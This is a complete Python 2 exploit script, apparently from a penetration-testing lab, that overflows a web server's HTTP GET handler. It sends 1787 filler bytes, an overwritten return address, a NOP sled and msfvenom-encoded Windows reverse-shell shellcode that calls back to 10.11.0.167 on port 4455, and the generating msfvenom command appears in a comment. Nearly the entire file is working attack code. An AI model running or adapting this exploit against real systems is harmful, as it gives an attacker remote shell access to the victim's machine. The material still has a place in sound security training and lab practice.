#!/usr/bin/python
import sys
import socket

# found bad chars- \x00\x0d
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=4455 -f c -e x86/shikata_ga_nai -b "\x00\x0d"
overflow = (
	"\xd9\xc1\xd9\x74\x24\xf4\xbd\xa7\x6b\x50\xb0\x5e\x2b\xc9\xb1"
	"\x52\x83\xc6\x04\x31\x6e\x13\x03\xc9\x78\xb2\x45\xe9\x97\xb0"
	"\xa6\x11\x68\xd5\x2f\xf4\x59\xd5\x54\x7d\xc9\xe5\x1f\xd3\xe6"
	"\x8e\x72\xc7\x7d\xe2\x5a\xe8\x36\x49\xbd\xc7\xc7\xe2\xfd\x46"
	"\x44\xf9\xd1\xa8\x75\x32\x24\xa9\xb2\x2f\xc5\xfb\x6b\x3b\x78"
	"\xeb\x18\x71\x41\x80\x53\x97\xc1\x75\x23\x96\xe0\x28\x3f\xc1"
	"\x22\xcb\xec\x79\x6b\xd3\xf1\x44\x25\x68\xc1\x33\xb4\xb8\x1b"
	"\xbb\x1b\x85\x93\x4e\x65\xc2\x14\xb1\x10\x3a\x67\x4c\x23\xf9"
	"\x15\x8a\xa6\x19\xbd\x59\x10\xc5\x3f\x8d\xc7\x8e\x4c\x7a\x83"
	"\xc8\x50\x7d\x40\x63\x6c\xf6\x67\xa3\xe4\x4c\x4c\x67\xac\x17"
	"\xed\x3e\x08\xf9\x12\x20\xf3\xa6\xb6\x2b\x1e\xb2\xca\x76\x77"
	"\x77\xe7\x88\x87\x1f\x70\xfb\xb5\x80\x2a\x93\xf5\x49\xf5\x64"
	"\xf9\x63\x41\xfa\x04\x8c\xb2\xd3\xc2\xd8\xe2\x4b\xe2\x60\x69"
	"\x8b\x0b\xb5\x3e\xdb\xa3\x66\xff\x8b\x03\xd7\x97\xc1\x8b\x08"
	"\x87\xea\x41\x21\x22\x11\x02\x44\xb8\x19\x75\x30\xbc\x19\x68"
	"\xa6\x49\xff\xe0\x38\x1c\xa8\x9c\xa1\x05\x22\x3c\x2d\x90\x4f"
	"\x7e\xa5\x17\xb0\x31\x4e\x5d\xa2\xa6\xbe\x28\x98\x61\xc0\x86"
	"\xb4\xee\x53\x4d\x44\x78\x48\xda\x13\x2d\xbe\x13\xf1\xc3\x99"
	"\x8d\xe7\x19\x7f\xf5\xa3\xc5\xbc\xf8\x2a\x8b\xf9\xde\x3c\x55"
	"\x01\x5b\x68\x09\x54\x35\xc6\xef\x0e\xf7\xb0\xb9\xfd\x51\x54"
	"\x3f\xce\x61\x22\x40\x1b\x14\xca\xf1\xf2\x61\xf5\x3e\x93\x65"
	"\x8e\x22\x03\x89\x45\xe7\x23\x68\x4f\x12\xcc\x35\x1a\x9f\x91"
	"\xc5\xf1\xdc\xaf\x45\xf3\x9c\x4b\x55\x76\x98\x10\xd1\x6b\xd0"
	"\x09\xb4\x8b\x47\x29\x9d"
	)

# return pointer - 76cd5d33 = \x33\x5d\xcd\x76
# Send crash and specify EIP to a jmp point where after a few NOPs it will execute shellcode
crash = "A" * 1787 + "\x33\x5d\xcd\x76" + "\x90" * 15 + overflow

# command to send to crash app/execute shellcode
shellcode = 'GET ' + crash + 'HTTP/1.1\r\n\r\n'

try:
	# connect to host
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',80))
	# send attack
	s.send(shellcode)
	# close session
	s.close()

except:
	# either app or host is down or some weird crash
	print "Error connecting to remote machine."
	sys.exit() 